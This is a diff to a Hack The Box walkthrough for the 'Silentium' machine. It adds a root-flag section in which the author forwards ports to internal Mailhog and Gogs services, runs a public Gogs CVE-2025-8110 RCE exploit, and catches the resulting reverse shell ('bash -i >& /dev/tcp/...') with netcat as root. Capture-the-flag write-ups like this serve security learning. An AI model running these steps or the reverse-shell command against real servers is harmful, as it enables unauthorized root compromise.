@@ -107,8 +107,8 @@ Connection received on 10.129.106.235 44075
 uid=0(root) gid=0(root) groups=0(root),0(root),..
 
 / # ls -la ~
--rw-------    1 root     root             9 Jan 29  2026 .ash_history
-drwxr-xr-x    3 root     root          4096 Aug 18 09:35 .flowise
+-rw------- 1 root root    9 Jan 29  2026 .ash_history
+drwxr-xr-x 3 root root 4096 Aug 18 09:35 .flowise
 
 / # cat /root/.ash_history
 env
@@ -130,9 +130,75 @@ ben@silentium:~$ ls -l
 user.txt
 ```
 
+## Root flag
+
+After examining the list of processes, we see several more applications that 
+are only available within the local host:
+
+```shell
+ben@silentium:~$ ps aux
+root 1492 0:01 /opt/gogs/gogs/gogs web
+root 1977 0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 3000 -container-ip 172.18.0.2 -container-port 3000
+root 2009 0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 1025 -container-ip 172.18.0.3 -container-port 1025
+root 2016 0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8025 -container-ip 172.18.0.3 -container-port 8025
+
+ben@silentium:~$ ss -lntp
+State   Local Address:Port
+LISTEN  127.0.0.1:33523
+LISTEN  127.0.0.1:3001
+LISTEN  127.0.0.1:3000
+LISTEN  0.0.0.0:80
+LISTEN  0.0.0.0:22
+LISTEN  127.0.0.1:1025
+LISTEN  127.0.0.1:8025
+```
+
+By forwarding ports we can explore internal services. On port `8025` you can 
+find the mailhog service with the email that was used to reset the password in 
+the exploit.
+
+<img src="/assets/img/hack-the-box-machine-silentium/port-8025.png">
+
+On port `3001` you can find the `Gogs` service - a code repository.
+
+<img src="/assets/img/hack-the-box-machine-silentium/port-3001-gogs.png">
+
+Register a user to check the content of the repository.
+
+<img src="/assets/img/hack-the-box-machine-silentium/port-3001.png">
+
+The repository is empty, so after a quick search, an exploit for the `Gogs` 
+vulnerability [^3] was found.
+
+```shell
+$ ssh -o IdentitiesOnly=yes -L 9000:127.0.0.1:3001 ben@silentium.htb &
+
+$ git clone git clone https://github.com/kayl22/cve-2025-8110-GOGS-RCE
+$ cd cve-2025-8110-GOGS-RCE/
+cve-2025-8110-GOGS-RCE$ python3 -m venv .venv
+cve-2025-8110-GOGS-RCE$ source .venv/bin/activate
+cve-2025-8110-GOGS-RCE$ pip3 install -r requirements.txt
+cve-2025-8110-GOGS-RCE$  python3 ./cve-2025-8110.py --url http://127.0.0.1:9000 -lh 10.10.17.215 -lp 9003 -U pwnuser -P password  
+  ...
+  [+] Reverse shell command: bash -c 'bash -i >& /dev/tcp/10.10.17.215/9003 0>&1' #
+```
+
+The exploit worked successfully and provides a reverse shell with root 
+privileges:
+
+```shell
+$ nc -lvnp 9003
+Listening on 0.0.0.0 9003
+Connection received on 10.129.106.235 45122
+
+root@silentium:/opt/gogs/gogs/data/tmp/local-repo/1# ls /root
+root.txt
+```
+
 ---
 
 ## References
 
 [^1]: [Flowise CVE-2025-58434](https://nvd.nist.gov/vuln/detail/cve-2025-58434)
 [^2]: [PoC CVE-2025-58434](https://github.com/AzureADTrent/CVE-2025-58434-59528)
+[^3]: [Gogs CVE-2025-8110](https://github.com/kayl22/cve-2025-8110-GOGS-RCE)
